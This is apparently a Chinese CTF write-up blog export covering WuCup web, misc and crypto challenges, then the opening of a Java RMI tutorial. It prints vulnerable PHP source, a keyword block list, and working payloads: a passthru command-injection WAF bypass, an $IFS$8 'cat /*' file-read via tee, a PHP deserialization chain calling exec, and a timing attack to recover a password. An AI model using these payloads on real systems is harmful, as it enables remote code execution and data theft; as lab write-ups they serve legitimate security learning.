<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>; </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">include_once <span class="string">&#x27;check.php&#x27;</span>; </span><br><span class="line">include_once <span class="string">&#x27;ban.php&#x27;</span>; </span><br><span class="line"></span><br><span class="line">$incompetent = $_POST[<span class="string">&#x27;incompetent&#x27;</span>]; </span><br><span class="line">$WuCup = $_POST[<span class="string">&#x27;WuCup&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($incompetent !== <span class="string">&#x27;HelloHacker&#x27;</span>) &#123; </span><br><span class="line">    die(<span class="string">&#x27;Come invade!&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$required_chars = [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;z&#x27;</span>]; </span><br><span class="line">$is_valid = <span class="literal">true</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!checkRequiredChars($WuCup, $required_chars)) &#123; </span><br><span class="line">    $is_valid = <span class="literal">false</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($is_valid) &#123; </span><br><span class="line"></span><br><span class="line">    $prohibited_file = <span class="string">&#x27;prohibited.txt&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span> (file_exists($prohibited_file)) &#123; </span><br><span class="line">        $file = fopen($prohibited_file, <span class="string">&#x27;r&#x27;</span>); </span><br><span class="line">         </span><br><span class="line"><span class="keyword">while</span> ($line = fgets($file)) &#123; </span><br><span class="line">    $line = rtrim($line, <span class="string">&quot;\r\n&quot;</span>);   </span><br><span class="line">    <span class="keyword">if</span> ($line === <span class="string">&#x27;&#x27;</span> &amp;&amp; strpos($WuCup, <span class="string">&#x27; &#x27;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line">       </span><br><span class="line">        <span class="keyword">continue</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span> (stripos($WuCup, $line) !== <span class="literal">false</span>) &#123; </span><br><span class="line">        fclose($file);   </span><br><span class="line">        die(<span class="string">&#x27;this road is blocked&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">         </span><br><span class="line">        fclose($file);   </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    eval($WuCup); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    die(<span class="string">&#x27;NO！NO！NO！&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>这里就可以发现，在里面有一个prohibited.txt，可以直接访问看到里面的waf，内容太多，只展现一些</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">d</span><br><span class="line">m</span><br><span class="line">g</span><br><span class="line">:<span class="comment">//</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">?</span></span><br><span class="line"><span class="string">@</span></span><br><span class="line"><span class="string">%</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">:</span></span><br><span class="line"><span class="string">$ </span></span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string">; </span></span><br><span class="line"><span class="string">\</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">eval </span></span><br><span class="line"><span class="string">exec</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">assert</span></span><br><span class="line"><span class="string">map</span></span><br><span class="line"><span class="string">open</span></span><br><span class="line"><span class="string">call</span></span><br><span class="line"><span class="string">array</span></span><br><span class="line"><span class="string">preg</span></span><br><span class="line"><span class="string">php</span></span><br><span class="line"><span class="string">cat</span></span><br><span class="line"><span class="string">sort</span></span><br><span class="line"><span class="string">shell</span></span><br><span class="line"><span class="string">echo</span></span><br><span class="line"><span class="string">tac</span></span><br></pre></td></tr></table></figure>
<p>在里面有些字符是有但是没有被过滤的，比如;号，因为后面多了一个空格，导致没有真正的过滤，还有” $,这些后面会用到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$required_chars = [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;z&#x27;</span>]; </span><br><span class="line">$is_valid = <span class="literal">true</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!checkRequiredChars($WuCup, $required_chars)) &#123; </span><br><span class="line">    $is_valid = <span class="literal">false</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这里需要有一个required_chars里面字符的排列组合,通过python脚本找到一个没有给过滤的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"># 需要检查的字符串</span><br><span class="line">string_to_permute = <span class="string">&quot;pevanxroz&quot;</span></span><br><span class="line"></span><br><span class="line"># 禁止列表文件路径</span><br><span class="line">prohibited_file_path = r<span class="string">&quot;D:\写题\1.txt&quot;</span></span><br><span class="line"></span><br><span class="line"># 读取禁止列表文件中的所有内容</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    with <span class="title function_">open</span><span class="params">(prohibited_file_path, <span class="string">&#x27;r&#x27;</span>)</span> as file:</span><br><span class="line">        prohibited_list = set(file.read().splitlines())</span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(f<span class="string">&quot;文件 &#123;prohibited_file_path&#125; 未找到。&quot;</span>)</span><br><span class="line">    prohibited_list = set()</span><br><span class="line"></span><br><span class="line"># 生成所有排列组合</span><br><span class="line">permutations = itertools.permutations(string_to_permute)</span><br><span class="line"></span><br><span class="line"># 过滤掉禁止列表中的排列组合</span><br><span class="line">allowed_permutations = [<span class="string">&#x27;&#x27;</span>.join(p) <span class="keyword">for</span> p in permutations <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.join(p) not in prohibited_list]</span><br><span class="line"></span><br><span class="line"># 打印不在禁止列表中的排列组合</span><br><span class="line"><span class="keyword">for</span> permutation in allowed_permutations:</span><br><span class="line">    print(permutation)</span><br></pre></td></tr></table></figure>
<p>oxzverapn，下面就可以通过;来进行分隔，发现passthru函数没有给过滤，可以通过passthru来命令执行，因为/号给过滤就想如何获取/再继续字符拼接即可，这里可以通过chr来将ascii码转字符,通过join函数来拼接，最后就可以得flag</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">incompetent=HelloHacker&amp;WuCup=oxzverapn;$a=[<span class="string">&quot;nl%09&quot;</span>,chr(<span class="number">47</span>),<span class="string">&quot;*&quot;</span>];$s=join(<span class="string">&quot;&quot;</span>,$a);print_r($s);passthru($s);</span><br></pre></td></tr></table></figure>
<h3 id="TimeCage"><a href="#TimeCage" class="headerlink" title="TimeCage"></a>TimeCage</h3><p>首先给源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">show_source</span><span class="params">(__FILE__)</span>;</span><br><span class="line">include <span class="string">&#x27;secret.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;input&#x27;</span>]))&#123;</span><br><span class="line">    $guess = $_GET[<span class="string">&#x27;input&#x27;</span>];</span><br><span class="line">    $target = random_int(<span class="number">114</span> , <span class="number">114</span> + date(<span class="string">&#x27;s&#x27;</span>) * <span class="number">100000</span>);</span><br><span class="line">    <span class="keyword">if</span>(intval($guess) === intval($target))&#123;</span><br><span class="line">        echo <span class="string">&quot;The next challenge in &quot;</span>.$key1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        echo <span class="string">&quot;Guess harder.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里其实认真看就可以知道如果当秒刚好为0时就可以使target为114,这里就可以提交input=114并且不断的刷新页面即可，或者通过python来反复发包</p>
<p><img src="https://luokuang1.github.io/images/wucup1.png" width="95%" height="80%"></p>
<p>下一关Trapping2147483647.php</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="title function_">show_source</span><span class="params">(__FILE__)</span>; </span><br><span class="line">include <span class="string">&#x27;secret.php&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;pass&#x27;</span>]))&#123; </span><br><span class="line">    $pass = $_POST[<span class="string">&#x27;pass&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(strlen($pass) != strlen($password))&#123; </span><br><span class="line">        die(<span class="string">&quot;Wrong Length!&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    $isMatch = <span class="literal">true</span>; </span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; strlen($password); $i++)&#123; </span><br><span class="line">        <span class="keyword">if</span>($pass[$i] != $password[$i])&#123; </span><br><span class="line">            $isMatch = <span class="literal">false</span>; </span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        sleep(<span class="number">1</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>($isMatch)&#123; </span><br><span class="line">        echo <span class="string">&quot;The final challenge in &quot;</span>.$key2; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        echo <span class="string">&quot;Wrong Pass!&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//Only digital characters in the password. </span></span><br></pre></td></tr></table></figure>
<p>这里是要获取password,可以先产生获取其长度，输入11111111得其长度为8，下面就可以产生每一位数的具体值</p>
<p>不断修改看方式请求的时间来判断，一个成功时间就会大于1秒，就不断的尝试，脚本发送有时判断不够准确，所以直接手动判断，最后得密码为56983215</p>
<p><img src="https://luokuang1.github.io/images/wucup2.png" width="95%" height="80%"></p>
<p>下一关EscapeEsc@p3Escape.php，这里就是一个rce,只是shell_exec没有回显</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="title function_">if</span><span class="params">(isset($_POST[<span class="string">&#x27;cmd&#x27;</span>])</span>)&#123; </span><br><span class="line">    $cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>]; </span><br><span class="line">    $pattern = <span class="string">&#x27;/[\&#123;\&#125;\[\]\(\)&amp;&lt;&gt;`\s\\\\]/&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(preg_match($pattern,$cmd))&#123; </span><br><span class="line">        die(<span class="string">&quot;Invalid Input!&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    shell_exec($cmd); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag is in /flag</span></span><br></pre></td></tr></table></figure>
<p>空格绕过用$IFS$8,刚开始尝试反弹shell但是没有成功，下面就写入文件得回显如果直接通过&gt;&gt;是被过滤了，但是还可以通过tee加通配符绕过，但是如果直接通过创建还是找不到，最后就可以直接通过覆盖前面的文件读回显，这样就可以执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cmd=ls|tee$IFS$8index.php</span><br><span class="line">cmd=cat$IFS$<span class="number">8</span><span class="comment">/*|tee$IFS$8index.php</span></span><br></pre></td></tr></table></figure>
<h3 id="ezPHP"><a href="#ezPHP" class="headerlink" title="ezPHP"></a>ezPHP</h3><p><img src="https://luokuang1.github.io/images/wucup3.png" width="95%" height="80%"></p>
<p>刚开始不知道应该如何写，通过dirsearch发现有一个flag.php文件，可以访问但是空白，这里通过bp抓包得php版本</p>
<p><img src="https://luokuang1.github.io/images/wucup4.png" width="95%" height="80%"></p>
<p>下面就是通过查询对应的php版本问题知道有一个源码泄露</p>
<p><a href="https://www.cnblogs.com/Kawakaze777/p/17799235.html">https://www.cnblogs.com/Kawakaze777/p/17799235.html</a></p>
<p>下面就是跟着尝试得源码</p>
<p><img src="https://luokuang1.github.io/images/wucup5.png" width="95%" height="80%"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">error_reporting</span><span class="params">(<span class="number">0</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $OAO;</span><br><span class="line">    <span class="keyword">public</span> $QAQ;</span><br><span class="line">        <span class="keyword">public</span> $OVO;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__toString</span><span class="params">()</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/hello/&#x27;</span>, OVO))&#123;</span><br><span class="line">                        <span class="keyword">if</span> ($<span class="built_in">this</span>-&gt;OVO === <span class="string">&quot;hello&quot;</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> $<span class="built_in">this</span>-&gt;OAO-&gt;QAQ;</span><br><span class="line">                        &#125;        </span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> function <span class="title function_">__invoke</span><span class="params">()</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $<span class="built_in">this</span>-&gt;OVO;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pap;</span><br><span class="line">        <span class="keyword">public</span> $vqv;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__get</span><span class="params">($key)</span>&#123;</span><br><span class="line">        $functioin = $<span class="built_in">this</span>-&gt;pap;</span><br><span class="line">        <span class="keyword">return</span> $functioin();</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> function <span class="title function_">__toString</span><span class="params">()</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $<span class="built_in">this</span>-&gt;vqv;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">c</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $OOO;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__invoke</span><span class="params">()</span>&#123;</span><br><span class="line">                <span class="meta">@$_</span> = $<span class="built_in">this</span>-&gt;OOO;</span><br><span class="line">                $___ = $_GET;</span><br><span class="line">                var_dump($___);</span><br><span class="line">                <span class="keyword">if</span> (isset($___[<span class="string">&#x27;h_in.t&#x27;</span>])) &#123;</span><br><span class="line">                        unset($___[<span class="string">&#x27;h_in.t&#x27;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                var_dump($___);</span><br><span class="line">                echo <span class="meta">@call_user_func($_, ...$___)</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">d</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $UUU;</span><br><span class="line">    <span class="keyword">public</span> $uuu;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__wakeup</span><span class="params">()</span>&#123;</span><br><span class="line">                echo $<span class="built_in">this</span>-&gt;UUU;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> function <span class="title function_">__destruct</span><span class="params">()</span>&#123;</span><br><span class="line">                $<span class="built_in">this</span>-&gt;UUU;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;h_in.t&#x27;</span>]))&#123;</span><br><span class="line">        unserialize($_GET[<span class="string">&#x27;h_in.t&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>发现是一个反序列化，这里就当时没看清题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/hello/&#x27;</span>, OVO))&#123;</span><br><span class="line">                       <span class="keyword">if</span> ($<span class="built_in">this</span>-&gt;OVO === <span class="string">&quot;hello&quot;</span>) &#123;</span><br><span class="line">                               <span class="keyword">return</span> $<span class="built_in">this</span>-&gt;OAO-&gt;QAQ;</span><br><span class="line">                       &#125;        </span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure>
<p>这里的OVO都不是这个类的，所以根本不用绕过，直接传OVO=hello即可，下面就可以去调用链子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $OAO;</span><br><span class="line">    <span class="keyword">public</span> $QAQ;</span><br><span class="line">    <span class="keyword">public</span> $OVO=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pap=<span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $vqv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">d</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $UUU;</span><br><span class="line">    <span class="keyword">public</span> $uuu;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> <span class="title class_">d</span>();</span><br><span class="line">$a-&gt;UUU=<span class="keyword">new</span> <span class="title class_">a</span>();</span><br><span class="line">$a-&gt;UUU-&gt;OAO=<span class="keyword">new</span> <span class="title class_">b</span>();</span><br><span class="line">echo <span class="title function_">serialize</span><span class="params">($a)</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里首先可以读取phpinfo,参数合理化h[in.t即可，后面看到这里有很多的函数都给过滤了，但是exec没有</p>
<p><img src="https://luokuang1.github.io/images/wucup6.png" width="95%" height="80%"></p>
<p>下面就可以尝试通过exec来命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> function <span class="title function_">__invoke</span><span class="params">()</span>&#123;</span><br><span class="line">                <span class="meta">@$_</span> = $<span class="built_in">this</span>-&gt;OOO;</span><br><span class="line">                $___ = $_GET;</span><br><span class="line">                var_dump($___);</span><br><span class="line">                <span class="keyword">if</span> (isset($___[<span class="string">&#x27;h_in.t&#x27;</span>])) &#123;</span><br><span class="line">                        unset($___[<span class="string">&#x27;h_in.t&#x27;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                var_dump($___);</span><br><span class="line">                echo <span class="meta">@call_user_func($_, ...$___)</span>; </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里的invoke里面会将get提交的参数传给$<strong><em>，这个具体是一个数组，后面就会删除h_in.t参数值，所以$</em></strong>的值就是我们可以控制的了，下面就可以直接传参来执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $OAO;</span><br><span class="line">    <span class="keyword">public</span> $QAQ;</span><br><span class="line">        <span class="keyword">public</span> $OVO=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pap;</span><br><span class="line">        <span class="keyword">public</span> $vqv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">c</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $OOO=<span class="string">&quot;exec&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">d</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $UUU;</span><br><span class="line">    <span class="keyword">public</span> $uuu;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> <span class="title class_">d</span>();</span><br><span class="line">$a-&gt;UUU=<span class="keyword">new</span> <span class="title class_">a</span>();</span><br><span class="line">$a-&gt;UUU-&gt;OAO=<span class="keyword">new</span> <span class="title class_">b</span>();</span><br><span class="line">$a-&gt;UUU-&gt;OAO-&gt;pap=<span class="keyword">new</span> <span class="title class_">c</span>();</span><br><span class="line">echo <span class="title function_">serialize</span><span class="params">($a)</span>;</span><br><span class="line"><span class="comment">//O:1:&quot;d&quot;:2:&#123;s:3:&quot;UUU&quot;;O:1:&quot;a&quot;:3:&#123;s:3:&quot;OAO&quot;;O:1:&quot;b&quot;:2:&#123;s:3:&quot;pap&quot;;O:1:&quot;c&quot;:1:&#123;s:3:&quot;OOO&quot;;s:4:&quot;exec&quot;;&#125;s:3:&quot;vqv&quot;;N;&#125;s:3:&quot;QAQ&quot;;N;s:3:&quot;OVO&quot;;s:5:&quot;hello&quot;;&#125;s:3:&quot;uuu&quot;;N;&#125; </span></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>如果上传一个字母参数就会不成功，这里可能是因为…$<em>_</em>的原因，但时直接参数数字就可以了,也是尝试了很久还以为又出错了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">?h[in.t=O:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;UUU&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;OAO&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pap&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;OOO&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;exec&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;vqv&quot;</span>;N;&#125;s:<span class="number">3</span>:<span class="string">&quot;QAQ&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;OVO&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;uuu&quot;</span>;N;&#125;&amp;<span class="number">1</span>=cat <span class="comment">/*</span></span><br></pre></td></tr></table></figure>
<h3 id="Misc-Sign"><a href="#Misc-Sign" class="headerlink" title="Misc-Sign"></a>Misc-Sign</h3><p>这个就很简单了，就是一个base16解码得flag</p>
<h3 id="Easy"><a href="#Easy" class="headerlink" title="Easy"></a>Easy</h3><p>这个题考RC4，给了key解码flag</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">def <span class="title function_">rc4</span><span class="params">(key)</span>:</span><br><span class="line">    key_length = len(key)</span><br><span class="line">    s = list(range(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">256</span>)</span>:</span><br><span class="line">        j = (j + s[i] + ord(key[i % key_length])) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">def <span class="title function_">rc4_decrypt</span><span class="params">(ciphertext, key)</span>:</span><br><span class="line">    key_length = len(key)</span><br><span class="line">    s = rc4(key)</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    plaintext = []</span><br><span class="line">    <span class="keyword">for</span> <span class="type">byte</span> in ciphertext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        x = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        plaintext.append(<span class="type">byte</span> ^ s[x])</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"># 密钥</span><br><span class="line">key = <span class="string">&quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line"># 密文（十六进制字符串）</span><br><span class="line">ciphertext_hex = [</span><br><span class="line">    <span class="string">&quot;d8d2&quot;</span>, <span class="string">&quot;963e&quot;</span>, <span class="string">&quot;0d8a&quot;</span>, <span class="string">&quot;b853&quot;</span>, <span class="string">&quot;3d2a&quot;</span>, <span class="string">&quot;7fe2&quot;</span>, <span class="string">&quot;96c5&quot;</span>, <span class="string">&quot;2923&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3924&quot;</span>, <span class="string">&quot;6eba&quot;</span>, <span class="string">&quot;0d29&quot;</span>, <span class="string">&quot;2d57&quot;</span>, <span class="string">&quot;5257&quot;</span>, <span class="string">&quot;8359&quot;</span>, <span class="string">&quot;322c&quot;</span>, <span class="string">&quot;3a77&quot;</span>,</span><br><span class="line">    <span class="string">&quot;892d&quot;</span>, <span class="string">&quot;fa72&quot;</span>, <span class="string">&quot;61b8&quot;</span>, <span class="string">&quot;4f&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 将十六进制字符串转换为字节</span><br><span class="line">ciphertext = bytes.fromhex(<span class="string">&#x27;&#x27;</span>.join(ciphertext_hex))</span><br><span class="line"></span><br><span class="line"># 解密</span><br><span class="line">plaintext_bytes = rc4_decrypt(ciphertext, key)</span><br><span class="line"></span><br><span class="line"># 将字节序列转换为字符串</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(chr(<span class="type">byte</span>) <span class="keyword">for</span> <span class="type">byte</span> in plaintext_bytes)</span><br><span class="line">    print(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line">except UnicodeEncodeError as e:</span><br><span class="line">    print(<span class="string">&quot;Flag contains non-UTF-8 characters:&quot;</span>, plaintext_bytes)</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI反序列化</title>
    <url>/2024/12/18/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="简单RMI-一"><a href="#简单RMI-一" class="headerlink" title="简单RMI(一)"></a>简单RMI(一)</h2><p>参考文章：<a href="https://www.cnblogs.com/CoLo/p/15468660.html">https://www.cnblogs.com/CoLo/p/15468660.html</a></p>
<p>首先RMI是一个java远程方法调用协议，具体可以远程调用其他虚拟机中的对象来执行方法。也就是获取远程对象的引用，通过远程对象的引用调用远程对象的某个方法。</p>
<blockquote>
<p>它让我们获得对远程主机上对象的引用，并像在我们自己的虚拟机中一样使用它。RMI 允许我们调用远程对象上的方法，将真实的 Java 对象作为参数传递并获取真实的 Java 对象作为返回值。</p>
<p>无论在何处使用引用，方法调用都发生在原始对象上，该对象仍位于其原始主机上。如果远程主机向您返回对其对象之一的引用，您可以调用该对象的方法；实际的方法调用将发生在对象所在的远程主机上。</p>
</blockquote>
<p>在RMI中需要了解一些常见的点，关于远程接口和远程对象和远程路由表</p>
<p><strong>远程与非远程对象</strong></p>
<p>远程对象：RMI中的远程对象首先需要可以序列化；并且需要实现特殊远程接口的对象，该接口指定可以远程调用对象的哪些方法（这个后面会详细提到）；其次该对象是通过一种可以通过网络传递的特殊对象引用来使用的。和普通的  Java 对象一样，远程对象是通过引用传递。也就是在调用远程对象的方法时是通过该对象的引用完成的</p>
<p>非远程对象：非远程对象与远程对象相比只是可被序列化而已，并不会像远程对象那样通过调用远程对象的引用来完成调用方法的操作，而是将非远程对象做一个简单地拷贝(simply copied)，也就是说非远程对象是通过拷贝进行传递。</p>
<p><strong>Remote Interface</strong></p>
<p>上面我们提到了远程对象需要实现特殊的远程接口，下面会涉及三个概念</p>
<blockquote>
<p>java.rmi.Remote ==&gt; 特殊的远程接口 extends Remote ==&gt; 远程对象类 implements 特殊的远程接口</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">say</span><span class="params">()</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">    String <span class="title function_">sayhello</span><span class="params">()</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Remote Object</strong></p>
<p>在远程对象中一般需要继承UnicastRemoteObject类,因为继承UnicastRemoteObject类的子类会被exports出去，绑定随机端口，开始监听来自客户端（Stubs）的请求,创建远程对象类需要显示定义构造方法并抛出RemoteException，即使是个无参构造也需要如此，<strong>不然会报错</strong></p>
